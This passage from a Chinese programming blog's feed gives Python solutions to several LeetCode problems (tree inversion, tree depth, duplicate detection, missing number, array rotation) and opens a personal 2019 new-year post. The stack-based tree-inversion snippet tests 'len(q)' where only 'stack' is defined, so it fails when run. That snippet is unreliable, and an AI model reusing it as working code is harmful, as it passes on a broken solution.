<p>　　深度优先搜索，递归解法，每次递归交换当前节点的左右子树，同时对左右子树做同样的处理。写法简单，但是比较耗内存。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># Definition for a binary tree node.</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">invertTree</span><span class="params">(self, root)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type root: TreeNode</div><div class="line">        :rtype: TreeNode</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> root</div><div class="line">        <span class="keyword">if</span> root.left <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">or</span> root.right <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">            tmp = root.left</div><div class="line">            root.left = root.right</div><div class="line">            root.right = tmp</div><div class="line">            <span class="keyword">if</span> root.left <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                self.invertTree(root.left)</div><div class="line">            <span class="keyword">if</span> root.right <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                self.invertTree(root.right)</div><div class="line">        <span class="keyword">return</span> root</div></pre></td></tr></table></figure>
<p>　　简化的写法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># Definition for a binary tree node.</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">invertTree</span><span class="params">(self, root)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type root: TreeNode</div><div class="line">        :rtype: TreeNode</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> root:</div><div class="line">            root.left, root.right = self.invertTree(root.right), self.invertTree(root.left)   </div><div class="line">        <span class="keyword">return</span> root</div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　非递归解法，借助队列来实现，依次检查队头元素，如果右子节点则将其互换，然后加入队列，直到队列中没有元素：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># Definition for a binary tree node.</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">invertTree</span><span class="params">(self, root)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type root: TreeNode</div><div class="line">        :rtype: TreeNode</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        q = [root]</div><div class="line">        <span class="keyword">while</span> (len(q) &gt; <span class="number">0</span>):</div><div class="line">            node = q[<span class="number">0</span>]  <span class="comment"># 获得队头元素</span></div><div class="line">            node.left, node.right = node.right, node.left  <span class="comment"># 交换</span></div><div class="line">            <span class="keyword">if</span> node.left:</div><div class="line">                q.append(node.left)  <span class="comment"># 左子节点加入队列</span></div><div class="line">            <span class="keyword">if</span> node.right:</div><div class="line">                q.append(node.right)  <span class="comment"># 右子节点加入队列</span></div><div class="line">            <span class="keyword">del</span> q[<span class="number">0</span>]  <span class="comment"># 移除队头元素</span></div><div class="line">        <span class="keyword">return</span> root</div></pre></td></tr></table></figure>
<p>　　也可以使用栈来实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># Definition for a binary tree node.</span></div><div class="line"><span class="comment"># class TreeNode(object):</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">invertTree</span><span class="params">(self, root)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type root: TreeNode</div><div class="line">        :rtype: TreeNode</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        stack = [root]</div><div class="line">        <span class="keyword">while</span> (len(q) &gt; <span class="number">0</span>):</div><div class="line">            node = stack.pop()  <span class="comment"># 取出栈顶元素</span></div><div class="line">            node.left, node.right = node.right, node.left  <span class="comment"># 交换</span></div><div class="line">            <span class="keyword">if</span> node.left:</div><div class="line">                stack.append(node.left)  <span class="comment"># 左子节点入栈</span></div><div class="line">            <span class="keyword">if</span> node.right:</div><div class="line">                stack.append(node.right)  <span class="comment"># 右子节点入栈</span></div><div class="line">        <span class="keyword">return</span> root</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Tree</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 104. Maximum Depth of Binary Tree</title>
    <url>/2019/01/11/LeetCode-104-Maximum-Depth-of-Binary-Tree/</url>
    <content><![CDATA[<center>LeetCode 104. Maximum Depth of Binary Tree 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>Given a binary tree, find its maximum depth.</p>
<p>The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.</p>
<p><strong>Note:</strong> A leaf is a node with no children.</p>
<ul>
<li><strong>中文：</strong> </li>
</ul>
<p>给定一个二叉树，找出其最大深度。</p>
<p>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p>
<p><strong>说明:</strong> 叶子节点是指没有子节点的节点。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p>给定二叉树 <code>[3,9,20,null,null,15,7]</code>，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">  3</div><div class="line"> / \</div><div class="line">9  20</div><div class="line">  /  \</div><div class="line"> 15   7</div></pre></td></tr></table></figure>
<p>返回它的最大深度 3 。</p>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　深度优先搜索（DFS），递归求解，树的深度 = max（左子树深度，右子树深度）+ 1。分别遍历根节点的左右子树（这里的根节点是相对而言的，不只是最初的根节点），每遍历一层，加 1，比较左右结果大小，最后结果再加 1。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxDepth</span><span class="params">(self, root)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type root: TreeNode</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        <span class="keyword">return</span> <span class="number">1</span> + max(self.maxDepth(root.left), self.maxDepth(root.right))</div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　广度优先搜索，利用队列求解。每次从队头取出元素，检查是否有子节点，如果有则将节点的左右子节点分别加入队列，每次检查深度都加 1，直到队列中不再有元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxDepth</span><span class="params">(self, root)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type root: TreeNode</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        depth = <span class="number">0</span></div><div class="line">        q = [root]</div><div class="line">        <span class="keyword">while</span>(len(q)!=<span class="number">0</span>):</div><div class="line">            depth += <span class="number">1</span>	<span class="comment"># 深度统计</span></div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(q)):</div><div class="line">                <span class="keyword">if</span> q[<span class="number">0</span>].left:</div><div class="line">                    q.append(q[<span class="number">0</span>].left)	<span class="comment"># 左子节点插入到队列</span></div><div class="line">                <span class="keyword">if</span> q[<span class="number">0</span>].right:</div><div class="line">                    q.append(q[<span class="number">0</span>].right)	<span class="comment"># 右子节点插入到队列</span></div><div class="line">                <span class="keyword">del</span> q[<span class="number">0</span>]	<span class="comment"># 删除队头元素</span></div><div class="line">        <span class="keyword">return</span> depth</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Tree</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 219. Contains Duplicate II</title>
    <url>/2019/01/07/LeetCode-219-Contains-Duplicate-II/</url>
    <content><![CDATA[<center>LeetCode 219. Contains Duplicate II 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>Given an array of integers and an integer <em>k</em>, find out whether there are two distinct indices <em>i</em> and <em>j</em> in the array such that <strong>nums[i] = nums[j]</strong> and the <strong>absolute</strong> difference between <em>i</em> and <em>j</em> is at most <em>k</em>.</p>
<ul>
<li><strong>中文：</strong> </li>
</ul>
<p>给定一个整数数组和一个整数 <em>k</em>，判断数组中是否存在两个不同的索引 <em>i</em> 和 <em>j</em>，使得 <strong>nums [i] = nums [j]</strong>，并且 <em>i</em> 和 <em>j</em> 的差的绝对值最大为 <em>k</em>。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ul>
<li><strong>示例 1:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: nums = [1,2,3,1], k = 3</div><div class="line">输出: true</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 2:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: nums = [1,0,1,1], k = 1</div><div class="line">输出: true</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 3:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: nums = [1,2,3,1,2,3], k = 2</div><div class="line">输出: false</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　使用字典来进行处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">containsNearbyDuplicate</span><span class="params">(self, nums, k)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :type k: int</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        length = len(nums)</div><div class="line">        <span class="keyword">if</span> length &lt;= <span class="number">1</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        dic = &#123;&#125;</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</div><div class="line">            <span class="keyword">if</span> nums[i] <span class="keyword">in</span> dic:</div><div class="line">                <span class="keyword">if</span> i-dic[nums[i]] &lt;= k:</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">            dic[nums[i]] = i</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
<p>　　可以使用 217. Contains Duplicate 题中的方法稍作改进，使用 set() 方法得到不重复元素的集合，然后判断列表长度是否等于集合的长度，如果是则表示列表中没有重复的元素，直接返回 False。否则，进行上面的操作来做进一步的判断。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">containsNearbyDuplicate</span><span class="params">(self, nums, k)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :type k: int</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        length = len(nums)</div><div class="line">        <span class="keyword">if</span> length == len(set(nums)):	<span class="comment"># 改进的地方</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">if</span> length &lt;= <span class="number">1</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        dic = &#123;&#125;</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</div><div class="line">            <span class="keyword">if</span> nums[i] <span class="keyword">in</span> dic:</div><div class="line">                <span class="keyword">if</span> i-dic[nums[i]] &lt;= k:</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">            dic[nums[i]] = i</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　使用集合，集合中只存放 k 个元素，即满足题目要求的两个索引 <em>i</em> 和 <em>j</em> 的差的绝对值最大为。遍历数组，每次判断元素是否在集合中，如果在，则表示有满足条件的重复元素，返回 True，并且每次都将元素加入到集合中，判断集合中元素个数是否大于 k，如果大于，则将第一个元素移除，保证集合中元素的索引与当前元素的索引相差最大为 k，即只考虑当前元素的前面 k 个元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">containsNearbyDuplicate</span><span class="params">(self, nums, k)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :type k: int</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        record = set()</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</div><div class="line">            <span class="keyword">if</span> nums[i] <span class="keyword">in</span> record:  <span class="comment"># 有满足条件的重复元素</span></div><div class="line">                <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">            record.add(nums[i])  <span class="comment"># 加入到集合</span></div><div class="line">            <span class="keyword">if</span> len(record) == k + <span class="number">1</span>:  <span class="comment"># 保证集合中只有 k 个元素</span></div><div class="line">                record.remove(nums[i - k])  <span class="comment"># 移除最前面的元素</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 217. Contains Duplicate</title>
    <url>/2019/01/06/LeetCode-217-Contains-Duplicate/</url>
    <content><![CDATA[<center>LeetCode 217. Contains Duplicate 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>Given an array of integers, find if the array contains any duplicates.</p>
<p>Your function should return true if any value appears at least twice in the array, and it should return false if every element is distinct.</p>
<ul>
<li><strong>中文：</strong> </li>
</ul>
<p>给定一个整数数组，判断是否存在重复元素。</p>
<p>如果任何值在数组中出现至少两次，函数返回 true。如果数组中每个元素都不相同，则返回 false。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ul>
<li><strong>示例 1:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [1,2,3,1]</div><div class="line">输出: true</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 2:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [1,2,3,4]</div><div class="line">输出: false</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 3:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [1,1,1,3,3,4,3,2,4,2]</div><div class="line">输出: true</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　依据集合中元素不重复的特性，使用 set() 方法得到不重复元素的集合，然后判断列表长度是否等于集合的长度，如果是则表示列表中没有重复的元素，返回 False，否则，有，返回 True。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">containsDuplicate</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> len(nums) == len(set(nums)):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　先对列表进行排序，然后遍历列表，依次比较每个元素是否等于其后一个元素，如果等于，则表示列表中有重复的元素，返回 True，否则，返回 False。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">containsDuplicate</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        length = len(nums)</div><div class="line">        <span class="keyword">if</span> length == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        nums.sort()</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(length<span class="number">-1</span>):</div><div class="line">            <span class="keyword">if</span> nums[i] == nums[i+<span class="number">1</span>]:</div><div class="line">                <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 268. Missing Number</title>
    <url>/2019/01/05/LeetCode-268-Missing-Number/</url>
    <content><![CDATA[<center>LeetCode 268. Missing Number 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>Given an array containing <em>n</em> distinct numbers taken from <code>0, 1, 2, ..., n</code>, find the one that is missing from the array.</p>
<ul>
<li><strong>中文：</strong> </li>
</ul>
<p>给定一个包含 <code>0, 1, 2, ..., n</code> 中 <em>n</em> 个数的序列，找出 0 .. <em>n</em> 中没有出现在序列中的那个数。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ul>
<li><strong>示例 1:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [3,0,1]</div><div class="line">输出: 2</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 2:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [9,6,4,2,3,5,7,0,1]</div><div class="line">输出: 8</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　由于索引即为 0 到 n 的数，所以可以先对数组进行排序，然后遍历数组，依次比较每个数是否与其索引相等，如果不相等，则对应的索引即为缺失值。当然，还要注意处理最后一个数缺失的情况，因为遍历数组只能处理 0 到 n-1。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">missingNumber</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        length = len(nums)</div><div class="line">        nums.sort()  <span class="comment"># 排序</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(length):  <span class="comment"># 遍历数组，判断列表值是否与索引相等</span></div><div class="line">            <span class="keyword">if</span> nums[i] != i:  <span class="comment"># 如果不相等，则索引即为缺失的数</span></div><div class="line">                <span class="keyword">return</span> i</div><div class="line">        <span class="keyword">return</span> nums[length - <span class="number">1</span>] + <span class="number">1</span>  <span class="comment"># 处理缺失最后一个数的情况</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong> </li>
</ul>
<p>　　首先计算 0 到 n 的和，然后用和减去数组元素的和，即可得到缺失的元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">missingNumber</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        con = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)+<span class="number">1</span>):	<span class="comment"># 求和</span></div><div class="line">            con += i</div><div class="line">        <span class="keyword">return</span> con - sum(nums)	<span class="comment"># 得到缺失值</span></div></pre></td></tr></table></figure>
<p>　　也可以直接使用公式计算和，然后减去数组元素的和，即可得到缺失的元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">missingNumber</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        length = len(nums)          </div><div class="line">        <span class="keyword">return</span> int(length*(length+<span class="number">1</span>)/<span class="number">2</span> - sum(nums))</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 189. Rotate Array</title>
    <url>/2019/01/02/LeetCode-189-Rotate-Array/</url>
    <content><![CDATA[<center>LeetCode 189. Rotate Array 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>Given an array, rotate the array to the right by <em>k</em> steps, where <em>k</em> is non-negative.</p>
<ul>
<li><strong>中文：</strong> </li>
</ul>
<p>给定一个数组，将数组中的元素向右移动 <em>k</em> 个位置，其中 <em>k</em> 是非负数。</p>
<p><strong>说明:</strong></p>
<ul>
<li>尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。</li>
<li>要求使用空间复杂度为 O(1) 的原地算法。</li>
</ul>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p><strong>示例 1:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [1,2,3,4,5,6,7] 和 k = 3</div><div class="line">输出: [5,6,7,1,2,3,4]</div><div class="line">解释:</div><div class="line">向右旋转 1 步: [7,1,2,3,4,5,6]</div><div class="line">向右旋转 2 步: [6,7,1,2,3,4,5]</div><div class="line">向右旋转 3 步: [5,6,7,1,2,3,4]</div></pre></td></tr></table></figure>
<p><strong>示例 2:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [-1,-100,3,99] 和 k = 2</div><div class="line">输出: [3,99,-1,-100]</div><div class="line">解释: </div><div class="line">向右旋转 1 步: [99,-1,-100,3]</div><div class="line">向右旋转 2 步: [3,99,-1,-100]</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　思路很简单，每次弹出最后一个元素，再插入到列表索引为 0 的位置即可。但是，这种方法非常耗时。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rotate</span><span class="params">(self, nums, k)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :type k: int</div><div class="line">        :rtype: void Do not return anything, modify nums in-place instead.</div><div class="line">        """</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</div><div class="line">            n = nums.pop()  <span class="comment"># 弹出</span></div><div class="line">            nums.insert(<span class="number">0</span>, n)  <span class="comment"># 插入</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　巧用 <code>reversed()</code> 反转函数，先将整个列表反转，然后再对前 k 个反转，再对 k+1 到列表末尾的反转。以列表 <code>[1, 2, 3, 4, 5, 6, 7]</code> 为例，向右移 k=3 个位置，先将整个列表反转得到 <code>[7, 6, 5, 4, 3, 2, 1]</code> ，再对前 3 个反转得到 <code>[5, 6, 7, 4, 3, 2, 1]</code>，最后对第 4 到 7 个元素进行反转得到 <code>[5, 6, 7, 1, 2, 3, 4]</code> 。但是，这里需要注意，k 可能会超过列表的长度，我们可以发现，当列表长度为 7 时， <code>k = 3</code> 和 <code>k = 10</code>，得到的结果是一样的，因为当 <code>k = 10</code> 时只是将列表所有数都移动了一遍，然后再移动 <code>k = 3</code> 次。所以，我们通过 <code>k=k%len(nums)</code> 来处理这种情况。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rotate</span><span class="params">(self, nums, k)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :type k: int</div><div class="line">        :rtype: void Do not return anything, modify nums in-place instead.</div><div class="line">        """</div><div class="line">        l = len(nums)</div><div class="line">        k = k % l  <span class="comment"># 处理 k 超过列表长度的情况 </span></div><div class="line">        nums.reverse()  <span class="comment"># 列表反转</span></div><div class="line">        nums[:k] = reversed(nums[:k])  <span class="comment"># 列表前 k 个元素反转</span></div><div class="line">        nums[k:l] = reversed(nums[k:l])  <span class="comment"># 列表 第 k+1 个开始到列表末尾的元素反转</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>2019-我们都是追梦人</title>
    <url>/2019/01/01/2019-%E6%88%91%E4%BB%AC%E9%83%BD%E6%98%AF%E8%BF%BD%E6%A2%A6%E4%BA%BA/</url>
    <content><![CDATA[<center>2019，我们都要努力奔跑，我们都是追梦人。</center>

<a id="more"></a>
<p>　　2018年元旦，我写了一篇简短的博客，从 2017，遇见不一样的自己，回顾 2017 年的点滴，到 2018，预见不一样的自己，展望 2018 的美好。时间过得飞快，2018 就这样悄无声息地过去了。又一年跨年，一个人在宿舍，认真总结着我的 2018，迎接全新而美好的 2019 。写着写着，突然很感慨，一年真的很长，遇见了很多人，经历了很多事，但也过得很快很快。</p>
<p>　　这一年里，最大的收获，最幸运的事情，那就是找到了觉得可以陪伴一生的伴侣。在一起的半年多里，从一开始的不信任到现在的极度甜蜜。原本两个有太多不同的人走到一起，确实有太多的不容易，也会需要很多的时间来磨合。有那么一段时间，我真的以为这段感情就要结束了，写了好多好多绝望的话，但是最后都删掉了。很庆幸，最后我都坚持下来了，也还好，经历过那些以后，现在我们都很爱对方。我亲爱的女朋友，是你，让我的生活变得丰富多彩，我们一起学习，一起看电影刷剧，一起谈人生谈理想等等；也是你，让我懂得如何去爱一个人，让我明白要好好爱自己的家人；更是你，让我知道如何去珍惜现在的生活。谢谢我的女朋友陪我度过不一样的2018，希望以后我们可以一起去做更多的事情，一起去更多的地方，留下更多美好的回忆。</p>
